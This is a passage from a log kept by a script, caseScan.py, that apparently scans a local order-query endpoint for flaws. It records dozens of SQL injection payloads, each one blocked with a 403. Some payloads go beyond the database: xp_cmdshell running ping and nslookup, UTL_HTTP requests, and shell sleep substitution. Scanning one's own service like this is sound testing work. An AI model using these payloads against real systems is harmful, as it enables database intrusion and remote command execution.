  "message": "order_id not exist"
}

[INFO]00:18:18:746-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "x' AND 1=(SELECT COUNT(*) FROM tabname); --\n"}}
[INFO]00:18:18:747-caseScan.py:113 >> code: 403
[INFO]00:18:18:747-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:774-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "x' AND members.email IS NULL; --\n"}}
[INFO]00:18:18:775-caseScan.py:113 >> code: 403
[INFO]00:18:18:775-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:812-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "x' OR full_name LIKE '%Bob%\n"}}
[INFO]00:18:18:813-caseScan.py:113 >> code: 403
[INFO]00:18:18:813-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:851-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "23 OR 1=1\n"}}
[INFO]00:18:18:852-caseScan.py:113 >> code: 403
[INFO]00:18:18:853-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:882-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'; exec master..xp_cmdshell 'ping 172.10.1.255'--\n"}}
[INFO]00:18:18:883-caseScan.py:113 >> code: 403
[INFO]00:18:18:884-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:910-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'\n"}}
[INFO]00:18:18:910-caseScan.py:113 >> code: 403
[INFO]00:18:18:911-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:937-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'%20or%20''='\n"}}
[INFO]00:18:18:938-caseScan.py:113 >> code: 403
[INFO]00:18:18:938-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:965-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'%20or%20'x'='x\n"}}
[INFO]00:18:18:966-caseScan.py:113 >> code: 403
[INFO]00:18:18:966-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:992-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%20or%20x=x\n"}}
[INFO]00:18:18:993-caseScan.py:113 >> code: 403
[INFO]00:18:18:993-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:021-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "')%20or%20('x'='x\n"}}
[INFO]00:18:19:022-caseScan.py:113 >> code: 403
[INFO]00:18:19:023-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:048-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "0 or 1=1\n"}}
[INFO]00:18:19:049-caseScan.py:113 >> code: 403
[INFO]00:18:19:050-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:075-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 0=0 --\n"}}
[INFO]00:18:19:075-caseScan.py:113 >> code: 403
[INFO]00:18:19:076-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:101-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\" or 0=0 --\n"}}
[INFO]00:18:19:101-caseScan.py:113 >> code: 403
[INFO]00:18:19:102-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:127-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or 0=0 --\n"}}
[INFO]00:18:19:128-caseScan.py:113 >> code: 403
[INFO]00:18:19:129-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:155-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 0=0 #\n"}}
[INFO]00:18:19:155-caseScan.py:113 >> code: 403
[INFO]00:18:19:156-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:180-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": " or 0=0 #\"\n"}}
[INFO]00:18:19:181-caseScan.py:113 >> code: 403
[INFO]00:18:19:181-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:206-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or 0=0 #\n"}}
[INFO]00:18:19:207-caseScan.py:113 >> code: 403
[INFO]00:18:19:207-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:232-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 1=1--\n"}}
[INFO]00:18:19:232-caseScan.py:113 >> code: 403
[INFO]00:18:19:233-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:258-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\" or 1=1--\n"}}
[INFO]00:18:19:258-caseScan.py:113 >> code: 403
[INFO]00:18:19:259-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:284-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or '1'='1'--\n"}}
[INFO]00:18:19:284-caseScan.py:113 >> code: 403
[INFO]00:18:19:285-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:310-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 1 --'\n"}}
[INFO]00:18:19:311-caseScan.py:113 >> code: 403
[INFO]00:18:19:312-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:337-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or 1=1--\n"}}
[INFO]00:18:19:337-caseScan.py:113 >> code: 403
[INFO]00:18:19:338-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:364-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or%201=1\n"}}
[INFO]00:18:19:364-caseScan.py:113 >> code: 403
[INFO]00:18:19:365-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:391-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or%201=1 --\n"}}
[INFO]00:18:19:391-caseScan.py:113 >> code: 403
[INFO]00:18:19:392-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:418-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 1=1 or ''='\n"}}
[INFO]00:18:19:418-caseScan.py:113 >> code: 403
[INFO]00:18:19:419-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:443-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": " or 1=1 or \"\"=\n"}}
[INFO]00:18:19:443-caseScan.py:113 >> code: 403
[INFO]00:18:19:444-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:472-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or a=a--\n"}}
[INFO]00:18:19:472-caseScan.py:113 >> code: 403
[INFO]00:18:19:473-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:499-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": " or a=a\n"}}
[INFO]00:18:19:500-caseScan.py:113 >> code: 403
[INFO]00:18:19:500-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:525-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "') or ('a'='a\n"}}
[INFO]00:18:19:526-caseScan.py:113 >> code: 403
[INFO]00:18:19:527-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:614-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": ") or (a=a\n"}}
[INFO]00:18:19:615-caseScan.py:113 >> code: 403
[INFO]00:18:19:615-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:641-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "hi or a=a\n"}}
[INFO]00:18:19:642-caseScan.py:113 >> code: 403
[INFO]00:18:19:643-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:671-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "hi or 1=1 --\"\n"}}
[INFO]00:18:19:671-caseScan.py:113 >> code: 403
[INFO]00:18:19:672-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:699-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "hi' or 1=1 --\n"}}
[INFO]00:18:19:700-caseScan.py:113 >> code: 403
[INFO]00:18:19:700-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:724-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "hi' or 'a'='a\n"}}
[INFO]00:18:19:725-caseScan.py:113 >> code: 403
[INFO]00:18:19:725-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:751-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "hi') or ('a'='a\n"}}
[INFO]00:18:19:751-caseScan.py:113 >> code: 403
[INFO]00:18:19:752-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:781-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\"hi\"\") or (\"\"a\"\"=\"\"a\"\n"}}
[INFO]00:18:19:782-caseScan.py:113 >> code: 403
[INFO]00:18:19:782-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:809-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'hi' or 'x'='x';\n"}}
[INFO]00:18:19:810-caseScan.py:113 >> code: 403
[INFO]00:18:19:811-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:837-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "@variable\n"}}
[INFO]00:18:19:837-caseScan.py:113 >> code: 403
[INFO]00:18:19:838-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:865-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": ",@variable\n"}}
[INFO]00:18:19:866-caseScan.py:113 >> code: 403
[INFO]00:18:19:866-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:894-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "PRINT\n"}}
[INFO]00:18:19:895-caseScan.py:113 >> code: 403
[INFO]00:18:19:896-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:923-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "PRINT @@variable\n"}}
[INFO]00:18:19:924-caseScan.py:113 >> code: 403
[INFO]00:18:19:924-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:950-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "select\n"}}
[INFO]00:18:19:950-caseScan.py:113 >> code: 403
[INFO]00:18:19:951-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:19:976-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "insert\n"}}
[INFO]00:18:19:977-caseScan.py:113 >> code: 403
[INFO]00:18:19:978-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:005-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "as\n"}}
[INFO]00:18:20:006-caseScan.py:113 >> code: 403
[INFO]00:18:20:006-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:035-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "or\n"}}
[INFO]00:18:20:036-caseScan.py:113 >> code: 403
[INFO]00:18:20:036-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:061-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "procedure\n"}}
[INFO]00:18:20:062-caseScan.py:113 >> code: 403
[INFO]00:18:20:062-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:088-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "limit\n"}}
[INFO]00:18:20:089-caseScan.py:113 >> code: 403
[INFO]00:18:20:089-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:124-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "order by\n"}}
[INFO]00:18:20:125-caseScan.py:113 >> code: 403
[INFO]00:18:20:125-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:151-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "asc\n"}}
[INFO]00:18:20:152-caseScan.py:113 >> code: 403
[INFO]00:18:20:152-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:177-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "desc\n"}}
[INFO]00:18:20:177-caseScan.py:113 >> code: 403
[INFO]00:18:20:178-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:203-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "delete\n"}}
[INFO]00:18:20:204-caseScan.py:113 >> code: 403
[INFO]00:18:20:204-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:231-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "update\n"}}
[INFO]00:18:20:232-caseScan.py:113 >> code: 403
[INFO]00:18:20:232-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:258-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "distinct\n"}}
[INFO]00:18:20:259-caseScan.py:113 >> code: 403
[INFO]00:18:20:259-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:283-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "having\n"}}
[INFO]00:18:20:284-caseScan.py:113 >> code: 403
[INFO]00:18:20:285-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:310-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "truncate\n"}}
[INFO]00:18:20:311-caseScan.py:113 >> code: 403
[INFO]00:18:20:311-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:340-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "replace\n"}}
[INFO]00:18:20:341-caseScan.py:113 >> code: 403
[INFO]00:18:20:341-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:368-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "like\n"}}
[INFO]00:18:20:368-caseScan.py:113 >> code: 403
[INFO]00:18:20:369-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:393-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "handler\n"}}
[INFO]00:18:20:394-caseScan.py:113 >> code: 403
[INFO]00:18:20:394-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:419-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "bfilename\n"}}
[INFO]00:18:20:420-caseScan.py:113 >> code: 403
[INFO]00:18:20:420-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:448-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or username like '%\n"}}
[INFO]00:18:20:449-caseScan.py:113 >> code: 403
[INFO]00:18:20:449-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:475-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or uname like '%\n"}}
[INFO]00:18:20:476-caseScan.py:113 >> code: 403
[INFO]00:18:20:477-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:501-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or userid like '%\n"}}
[INFO]00:18:20:502-caseScan.py:113 >> code: 403
[INFO]00:18:20:502-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:528-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or uid like '%\n"}}
[INFO]00:18:20:528-caseScan.py:113 >> code: 403
[INFO]00:18:20:529-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:557-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or user like '%\n"}}
[INFO]00:18:20:557-caseScan.py:113 >> code: 403
[INFO]00:18:20:558-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:584-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "exec xp\n"}}
[INFO]00:18:20:584-caseScan.py:113 >> code: 403
[INFO]00:18:20:585-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:610-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "exec sp\n"}}
[INFO]00:18:20:611-caseScan.py:113 >> code: 403
[INFO]00:18:20:611-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:638-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'; exec master..xp_cmdshell\n"}}
[INFO]00:18:20:639-caseScan.py:113 >> code: 403
[INFO]00:18:20:639-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:667-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'; exec xp_regread\n"}}
[INFO]00:18:20:668-caseScan.py:113 >> code: 403
[INFO]00:18:20:668-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:694-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "t'exec master..xp_cmdshell 'nslookup www.google.com'--\n"}}
[INFO]00:18:20:695-caseScan.py:113 >> code: 403
[INFO]00:18:20:695-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:721-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "--sp_password\n"}}
[INFO]00:18:20:721-caseScan.py:113 >> code: 403
[INFO]00:18:20:722-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:748-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\\x27UNION SELECT\n"}}
[INFO]00:18:20:749-caseScan.py:113 >> code: 403
[INFO]00:18:20:749-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:777-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' UNION SELECT\n"}}
[INFO]00:18:20:777-caseScan.py:113 >> code: 403
[INFO]00:18:20:778-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:804-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' UNION ALL SELECT\n"}}
[INFO]00:18:20:805-caseScan.py:113 >> code: 403
[INFO]00:18:20:806-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:831-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or (EXISTS)\n"}}
[INFO]00:18:20:831-caseScan.py:113 >> code: 403
[INFO]00:18:20:832-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:858-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' (select top 1\n"}}
[INFO]00:18:20:859-caseScan.py:113 >> code: 403
[INFO]00:18:20:859-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:889-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'||UTL_HTTP.REQUEST\n"}}
[INFO]00:18:20:889-caseScan.py:113 >> code: 403
[INFO]00:18:20:890-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:917-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "1;SELECT%20*\n"}}
[INFO]00:18:20:917-caseScan.py:113 >> code: 403
[INFO]00:18:20:918-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:944-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "to_timestamp_tz\n"}}
[INFO]00:18:20:945-caseScan.py:113 >> code: 403
[INFO]00:18:20:945-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:20:972-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "tz_offset\n"}}
[INFO]00:18:20:972-caseScan.py:113 >> code: 403
[INFO]00:18:20:973-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:000-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "<>\"'%;)(&+\n"}}
[INFO]00:18:21:001-caseScan.py:113 >> code: 403
[INFO]00:18:21:002-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:027-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'%20or%201=1\n"}}
[INFO]00:18:21:028-caseScan.py:113 >> code: 403
[INFO]00:18:21:029-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:057-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%27%20or%201=1\n"}}
[INFO]00:18:21:058-caseScan.py:113 >> code: 403
[INFO]00:18:21:058-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:085-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%20$(sleep%2050)\n"}}
[INFO]00:18:21:086-caseScan.py:113 >> code: 403
[INFO]00:18:21:086-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:115-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%20'sleep%2050'\n"}}
[INFO]00:18:21:116-caseScan.py:113 >> code: 403
